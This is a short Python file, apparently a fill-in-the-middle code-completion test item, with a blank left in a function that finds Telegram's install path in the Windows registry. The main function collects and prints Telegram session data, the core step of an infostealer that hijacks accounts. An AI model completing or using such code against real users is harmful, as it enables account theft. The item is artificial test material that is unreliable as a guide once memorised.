import os
import winreg
from pathlib import Path
from telegram_session import get_telegram_session_data

def get_telegram_installation_path():
        # Open the registry key for Telegram
            # Retrieve the installation path
    <FILL_HERE>
def main():
    """
    Main function to collect session data from Telegram.
    """
    # Get the installation path of Telegram
    telegram_path = get_telegram_installation_path()
    if telegram_path:
        # Get the session data from the specified path
        session_data = get_telegram_session_data(telegram_path)
        if session_data:
            print("Session data collected successfully:")
            print(session_data)
        else:
            print("Failed to collect session data.")
    else:
        print("Telegram installation path not found.")

if __name__ == "__main__":
    main()